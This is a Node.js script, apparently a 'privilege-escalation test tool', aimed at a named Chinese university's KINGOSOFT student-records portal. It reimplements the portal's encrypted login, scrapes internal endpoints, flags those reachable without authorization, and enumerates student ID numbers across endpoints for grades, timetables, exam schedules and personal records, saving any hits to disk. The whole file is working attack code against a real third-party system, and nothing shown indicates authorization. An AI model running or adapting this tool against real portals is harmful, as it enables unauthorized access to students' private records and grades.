#!/usr/bin/env node
/**
 * KINGOSOFT 强智教务系统 越权测试工具
 * 目标: https://jwmis.ncwu.edu.cn/hsjw  (华北水利水电大学, schoolcode=10078)
 *
 * 用法:
 *   node kingo.mjs login  <学号> <密码>
 *   node kingo.mjs menu
 *   node kingo.mjs probe
 *   node kingo.mjs idor   <学号前缀|学号列表文件>
 *   node kingo.mjs get    <路径>
 */
import fs from 'fs';
import crypto from 'crypto';
import vm from 'vm';
import path from 'path';
import { fileURLToPath } from 'url';

const __dirname = path.dirname(fileURLToPath(import.meta.url));

/* ---------------- 配置 ---------------- */
const CFG = {
  BASE: 'https://jwmis.ncwu.edu.cn/hsjw',
  ROOT: 'https://jwmis.ncwu.edu.cn',
  UA: 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36',
  SESSION_FILE: path.join(__dirname, 'session.json'),
  RESULT_DIR: path.join(__dirname, 'results'),
  TIMEOUT: 20000,
  DELAY: 350,          // 请求间隔(ms)，别把目标打死
  CONCURRENCY: 2,      // 并发数
};

/* ---------------- 加密库 ---------------- */
const desSrc = fs.readFileSync(path.join(__dirname, 'jkingo.des.js'), 'utf8');
const desCtx = vm.createContext({});
vm.runInContext(desSrc + '\n;globalThis.__strEnc = strEnc;', desCtx);
const strEnc = desCtx.__strEnc;

const md5 = s => crypto.createHash('md5').update(s, 'utf8').digest('hex');
const b64 = s => Buffer.from(s, 'utf8').toString('base64');
const sleep = ms => new Promise(r => setTimeout(r, ms));

/* ---------------- 工具 ---------------- */
function log(tag, msg) {
  const t = new Date().toTimeString().slice(0, 8);
  console.log(`[${t}] ${tag.padEnd(8)} ${msg}`);
}
function ensureDir(d) { if (!fs.existsSync(d)) fs.mkdirSync(d, { recursive: true }); }
function timestamp() {
  const d = new Date();
  const p = n => String(n).padStart(2, '0');
  return `${d.getFullYear()}${p(d.getMonth() + 1)}${p(d.getDate())}_${p(d.getHours())}${p(d.getMinutes())}${p(d.getSeconds())}`;
}
/** 统一判定: 577字节固定内容 = 未登录/无权限 */
function isAuthFailed(text) {
  return text.length < 700 && text.includes('凭证已失效');
}
function decode(html) {
  // 目标多为 UTF-8，部分页面 GBK。先按 UTF-8 返回，乱码自行 iconv
  return html;
}

/* ---------------- 客户端 ---------------- */
class Kingo {
  constructor() {
    this.cookie = '';
    this.sessionid = '';
    this.logged = false;
  }

  headers(extra = {}) {
    return {
      'User-Agent': CFG.UA,
      'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
      'Accept-Language': 'zh-CN,zh;q=0.9',
      ...(this.cookie ? { Cookie: this.cookie } : {}),
      ...extra,
    };
  }

  async req(url, opts = {}) {
    const full = url.startsWith('http') ? url : CFG.ROOT + url;
    const ac = new AbortController();
    const timer = setTimeout(() => ac.abort(), CFG.TIMEOUT);
    let r;
    try {
      r = await fetch(full, { ...opts, headers: this.headers(opts.headers), signal: ac.signal, redirect: 'manual' });
    } finally { clearTimeout(timer); }

    // 收集 cookie
    const sc = r.headers.getSetCookie ? r.headers.getSetCookie() : [];
    if (sc.length) {
      const jar = new Map();
      for (const c of (this.cookie || '').split('; ').filter(Boolean)) {
        const [k, ...v] = c.split('='); jar.set(k, v.join('='));
      }
      for (const c of sc) {
        const kv = c.split(';')[0];
        const [k, ...v] = kv.split('='); jar.set(k, v.join('='));
      }
      this.cookie = [...jar].map(([k, v]) => `${k}=${v}`).join('; ');
    }
    const text = await r.text();
    return { status: r.status, headers: r.headers, text, location: r.headers.get('location') };
  }

  /* ---------- 登录 ---------- */
  async login(username, password) {
    log('LOGIN', `目标 ${CFG.BASE}`);

    // 1. 取登录页 + 会话
    const r1 = await this.req('/hsjw/cas/login.action');
    const m = r1.text.match(/_sessionid\s*=\s*"([^"]+)"/);
    const ssid = m ? m[1] : '';
    const yzmbt = (r1.text.match(/var\s+yzmbt\s*=\s*"([^"]*)"/) || [, '0'])[1];
    this.sessionid = ssid || this.sessionid;
    log('LOGIN', `JSESSIONID=${(this.cookie.match(/JSESSIONID=([^;]+)/) || [, '?'])[1]}`);
    log('LOGIN', `_sessionid=${ssid}  验证码开关 yzmbt=${yzmbt}`);

    // 2. 取临时 DES key 与时间戳（免鉴权接口）
    const dk = (await this.req('/hsjw/frame/homepage?method=getTempDeskey')).text.trim();
    const ts = (await this.req('/hsjw/frame/homepage?method=getTempNowtime')).text.trim();
    log('LOGIN', `tempDeskey=${dk}  timestamp=${ts}`);
    if (!dk || !ts) throw new Error('获取临时密钥失败');

    // 3. 组装参数
    const randnumber = '';
    const pwdHashed = md5(md5(password));
    const params =
      `_u${randnumber}=${b64(username + ';;' + ssid)}` +
      `&_p${randnumber}=${pwdHashed}` +
      `&randnumber=${randnumber}&isPasswordPolicy=1` +
      `&txt_mm_expression=&txt_mm_length=&txt_mm_userzh=&hid_flag=1&hidlag=1&hid_dxyzm=`;

    const token = md5(md5(params) + md5(ts));
    const enc = b64(strEnc(params, dk, null, null));
    const body =
      `params=${encodeURIComponent(enc)}&token=${token}` +
      `&timestamp=${encodeURIComponent(ts)}&deskey=&ssessionid=${ssid}`;

    // 4. 提交
    const r2 = await this.req('/hsjw/cas/logon.action', {
      method: 'POST',
      headers: { 'Content-Type': 'application/x-www-form-urlencoded', Referer: CFG.ROOT + '/hsjw/cas/login.action' },
      body,
    });

    let j;
    try { j = JSON.parse(r2.text); } catch { throw new Error('登录响应非JSON: ' + r2.text.slice(0, 200)); }

    switch (j.status) {
      case '200':
        this.logged = true;
        log('LOGIN', `✅ 登录成功  → ${j.result}`);
        // 跟随跳转，建立完整会话
        try {
          const r3 = await this.req(j.result.startsWith('http') ? j.result : '/hsjw/' + j.result.replace(/^\/+/, ''));
          log('LOGIN', `跳转后状态 ${r3.status} 长度 ${r3.text.length}`);
        } catch (e) { log('LOGIN', '跳转失败(不影响): ' + e.message); }
        this.save();
        return j;
      case '402':
        log('LOGIN', `❌ 密码错误: ${j.message}`);
        log('LOGIN', `⚠️  已计入错误次数，5次锁号。停止重试!`);
        return j;
      case '505':
        log('LOGIN', `⚠️  需要验证码/短信: ${j.message}`);
        return j;
      default:
        log('LOGIN', `❌ 失败 status=${j.status}: ${j.message}`);
        return j;
    }
  }

  save() {
    fs.writeFileSync(CFG.SESSION_FILE, JSON.stringify(
      { cookie: this.cookie, sessionid: this.sessionid, logged: this.logged, ts: Date.now() }, null, 2));
    log('SAVE', CFG.SESSION_FILE);
  }
  load() {
    if (!fs.existsSync(CFG.SESSION_FILE)) return false;
    const s = JSON.parse(fs.readFileSync(CFG.SESSION_FILE, 'utf8'));
    this.cookie = s.cookie; this.sessionid = s.sessionid; this.logged = s.logged;
    return this.logged;
  }

  /* ---------- 菜单抓取 ---------- */
  async fetchMenu() {
    const r = await this.req('/hsjw/xtgl/index_initMenu.action');
    log('MENU', `index_initMenu.action → ${r.status} ${r.text.length}B`);
    if (isAuthFailed(r.text)) { log('MENU', '❌ 会话无效，请重新登录'); return null; }
    ensureDir(CFG.RESULT_DIR);
    fs.writeFileSync(path.join(CFG.RESULT_DIR, 'menu.html'), r.text);

    // 提取所有 .do / .action 链接及其 gnmkdm
    const items = new Map();
    const re = /["'\(](\/hsjw\/[A-Za-z0-9_\/\.\-]+\.(?:do|action))(?:\?([^"'\)]*))?["'\)]/g;
    let mm;
    while ((mm = re.exec(r.text))) {
      const p = mm[1], q = mm[2] || '';
      const g = (q.match(/gnmkdm=([A-Za-z0-9]+)/) || [, ''])[1];
      if (!items.has(p + '?' + g)) items.set(p + '?' + g, { path: p, query: q, gnmkdm: g });
    }
    // 单独提取 gnmkdm 码
    const gset = new Set();
    for (const g of r.text.matchAll(/gnmkdm[=:'"]+([A-Za-z0-9]{4,})/g)) gset.add(g[1]);

    log('MENU', `提取到 ${items.size} 个业务接口, ${gset.size} 个功能模块码`);
    for (const it of items.values()) log('MENU', `  ${it.gnmkdm.padEnd(10)} ${it.path}${it.query ? '?' + it.query : ''}`);
    fs.writeFileSync(path.join(CFG.RESULT_DIR, 'menu.json'),
      JSON.stringify({ items: [...items.values()], gnmkdm: [...gset] }, null, 2));
    return { items: [...items.values()], gnmkdm: [...gset] };
  }

  /* ---------- 通用请求(带鉴权判定) ---------- */
  async probe(pathAndQuery) {
    const r = await this.req(pathAndQuery);
    const failed = isAuthFailed(r.text);
    return { url: pathAndQuery, status: r.status, len: r.text.length, authFailed: failed, text: r.text };
  }
}

/* ---------------- 水平越权: 学号遍历 ---------------- */
const IDOR_ENDPOINTS = [
  '/hsjw/xsxxxggl/xsxxwh_cxXsxx.do',
  '/hsjw/xsxxxggl/xsxxx.do',
  '/hsjw/xsxxxggl/xsxxwh_cxXsxxNew.do',
  '/hsjw/xscj/cjcx_list.do',
  '/hsjw/xscj/cjcx.do',
  '/hsjw/xskb/xskb_list.do',
  '/hsjw/xskb/xskb.do',
  '/hsjw/kwgl/ksap_list.do',
  '/hsjw/kwgl/ksap.do',
  '/hsjw/pyfa/pyfa_list.do',
  '/hsjw/xjgl/xjxx_list.do',
  '/hsjw/xsxxxggl/xsjbxx.do',
  '/hsjw/xsxk/xsxk_list.do',
  '/hsjw/kbcx/kbcx_list.do',
];
const IDOR_PARAMS = ['xh', 'xsid', 'xhid', 'xh_id', 'studentid', 'sid', 'userId', 'yhm'];

/* ---------------- 主流程 ---------------- */
async function main() {
  const [cmd, ...args] = process.argv.slice(2);
  const k = new Kingo();

  switch (cmd) {
    case 'login': {
      const [user, pass] = args;
      if (!user || !pass) { console.error('用法: node kingo.mjs login <学号> <密码>'); process.exit(1); }
      await k.login(user, pass);
      break;
    }

    case 'menu': {
      if (!k.load()) { console.error('未登录，先执行 login'); process.exit(1); }
      await k.fetchMenu();
      break;
    }

    case 'probe': {
      if (!k.load()) { console.error('未登录，先执行 login'); process.exit(1); }
      const menu = JSON.parse(fs.readFileSync(path.join(CFG.RESULT_DIR, 'menu.json'), 'utf8'));
      ensureDir(CFG.RESULT_DIR);
      const rows = [];
      for (const it of menu.items) {
        await sleep(CFG.DELAY);
        const url = it.path + (it.query ? '?' + it.query : '');
        const r = await k.probe(url);
        const tag = r.authFailed ? 'DENY' : (r.len > 800 ? 'OPEN' : 'EMPTY');
        log('PROBE', `${tag.padEnd(6)} ${String(r.len).padStart(7)}B  ${url}`);
        rows.push({ tag, len: r.len, url });
      }
      fs.writeFileSync(path.join(CFG.RESULT_DIR, `probe_${timestamp()}.json`), JSON.stringify(rows, null, 2));
      log('PROBE', `完成，OPEN=${rows.filter(r => r.tag === 'OPEN').length} / 共 ${rows.length}`);
      break;
    }

    case 'idor': {
      if (!k.load()) { console.error('未登录，先执行 login'); process.exit(1); }
      const spec = args[0];
      if (!spec) { console.error('用法: node kingo.mjs idor <学号前缀>  |  node kingo.mjs idor @list.txt'); process.exit(1); }

      let targets = [];
      if (spec.startsWith('@')) {
        targets = fs.readFileSync(spec.slice(1), 'utf8').split(/\r?\n/).map(s => s.trim()).filter(Boolean);
      } else {
        // 前缀 + 4 位序号枚举（自行调整范围）
        const prefix = spec.replace(/\D/g, '');
        for (let i = 1; i <= 60; i++) targets.push(prefix + String(i).padStart(4, '0'));
      }
      log('IDOR', `目标学号 ${targets.length} 个`);

      const hits = [];
      for (const xh of targets) {
        for (const ep of IDOR_ENDPOINTS) {
          for (const p of IDOR_PARAMS) {
            const url = `${ep}?${p}=${xh}`;
            await sleep(CFG.DELAY);
            try {
              const r = await k.probe(url);
              // 命中判据: 非鉴权失败 且 页面含该学号 或 明显数据表格
              const hasXh = r.text.includes(xh);
              const hasTable = /<table|<tr|成绩|课程|姓名/i.test(r.text);
              if (!r.authFailed && r.len > 1000 && (hasXh || hasTable)) {
                log('HIT', `✅ ${url}  (${r.len}B)`);
                hits.push({ xh, url, len: r.len });
              }
            } catch (e) { /* 忽略单点异常 */ }
          }
        }
        if (hits.length >= 5) { log('IDOR', '已命中5条，提前停止以免过量'); break; }
      }
      ensureDir(CFG.RESULT_DIR);
      fs.writeFileSync(path.join(CFG.RESULT_DIR, `idor_${timestamp()}.json`), JSON.stringify(hits, null, 2));
      log('IDOR', `命中 ${hits.length} 条，结果已落盘`);
      break;
    }

    case 'get': {
      if (!k.load()) { console.error('未登录，先执行 login'); process.exit(1); }
      const p = args[0];
      const r = await k.probe(p);
      console.log(`status=${r.status} len=${r.len} authFailed=${r.authFailed}`);
      console.log(r.text.slice(0, 3000));
      break;
    }

    default:
      console.log(`KINGOSOFT 越权测试工具
  node kingo.mjs login <学号> <密码>   登录并保存会话
  node kingo.mjs menu                 抓取主菜单，提取全部业务接口与功能模块码
  node kingo.mjs probe                遍历菜单接口，标注 OPEN / DENY
  node kingo.mjs idor <前缀|@file>    水平越权：遍历学号参数
  node kingo.mjs get <路径>           带会话请求任意路径`);
  }
}

main().catch(e => { console.error('FATAL', e); process.exit(1); });
